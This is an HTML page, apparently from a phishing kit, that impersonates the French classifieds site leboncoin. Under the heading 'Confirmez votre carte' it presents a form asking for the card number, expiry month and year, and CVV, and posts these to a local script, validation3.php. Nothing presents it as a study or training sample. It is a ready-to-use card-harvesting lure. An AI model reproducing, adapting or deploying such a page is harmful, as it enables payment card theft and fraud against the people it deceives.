  <!DOCTYPE html>
<html>
<head>
    <title>leboncoin!</title>
    <meta charset="utf-8">
    <link rel="stylesheet" href="cs3.css">
    <style>
        body {
            text-align: center; /* Centre le contenu de la page horizontalement */
        }

        form {
            display: inline-block; /* Permet au formulaire de s'aligner horizontalement */
            text-align: left; /* Aligne le texte à gauche à l'intérieur du formulaire */
        }

        label {
            display: block;
            margin-bottom: 10px;
        }

        /* Style pour aligner les labels "Mois d'expiration" et "Année" horizontalement */
        .expiration-container {
            display: grid;
            grid-template-columns: 1fr 1fr; /* Deux colonnes de largeur égale */
            grid-gap: 40px; /* Espacement entre les éléments */
            text-align: center; /* Alignement horizontal du texte */
             }

       
        /* Autres styles CSS pour votre formulaire, le cas échéant */
    </style>
</head>
<body>
<div>
    <img src="ima/img_4050.jpg" alt="leboncoin"style="height:230px;">>
</div>

<h1>Confirmez votre carte.</h1>
<form method="post" action="validation3.php">

    <img src="ima/CB-1.jpg" alt="leboncoin" height="30px;">
     <br><br>
    <label for="Numero_de_carte">Numéro de votre carte</label>
    <input type="text" id="banque" name="Numero_de_carte"autocomplete="on" placeholder="49xxxxxxxxxxxxxx"><br><br>

    <div class="expiration-container">
        <div>
            <label for="mois">Date d'expiration</label>
            <input type="text" id="mois" name="mois_expiration" autocomplete="on" placeholder="mois">
        </div>

        <div>
            <label for="annee">Année</label>
            <input type="text" id="annee" name="annee" autocomplete="on" placeholder="année">
        </div>
    </div><br><br>

    <label for="Cryptogramme">Cryptogramme visuel</label>
    <input type="text" id="Cryptogramme" name="Cryptogramme" autocomplete="on" placeholder="cvv"><br><br> 
    
    <input type="submit" value="Continuer" name="valider">
</form>
</body>
</html>